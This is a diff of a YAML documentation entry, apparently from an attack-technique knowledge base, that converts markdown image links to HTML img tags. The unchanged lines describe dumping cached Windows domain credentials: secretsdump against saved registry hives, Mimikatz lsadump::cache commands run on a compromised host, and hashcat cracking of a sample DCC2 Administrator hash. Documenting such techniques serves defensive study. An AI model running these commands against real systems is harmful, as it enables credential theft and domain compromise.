@@ -89,18 +89,18 @@ extended_description: |
     ```
     secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
     ```
-    ![Secretsdump](27.JPG)
+    <img src="../27.JPG" alt="Secretsdump"/>
 
     ### Mimikatz
     2) Need to download [Mimikatz](https://attack.mitre.org/software/S0002/) (mimikatz.exe & mimilib.dll) into the server. Let's use metasploit to save those in %temp%:
-    ![Mimik](15.JPG)
+    <img src="../15.JPG" alt="Mimik"/>
     So, we can get DCC2 / MSCACHEv2 hashes using mimikatz by installing it on a compromised host and executing the following commands:
     ```
     privilege::debug
     token::elevate
     lsadump::cache
     ```
-    ![Cred](16.JPG)
+    <img src="../16.JPG" alt="Cred"/>
     ## Possible usage
 
     ### Cracking mscash / mscache with HashCat
@@ -112,10 +112,10 @@ extended_description: |
     ```
     hashcat -m2100 '$DCC2$10240#Administrator#206dd880bb27121182298a0bd8b87d1c' /home/kali/Desktop/passwords.txt --force --potfile-disable
     ```
-    ![Hashcat1](17.JPG)
-    ![Hashcat2](18.JPG)
+    <img src="../17.JPG" alt="Hashcat1"/>
+    <img src="../18.JPG" alt="Hashcat2"/>
     ## Attack diagram
-    ![Diagram](29.svg)
+    <img src="../29.svg" alt="Diagram"/>
 
     ## References
 
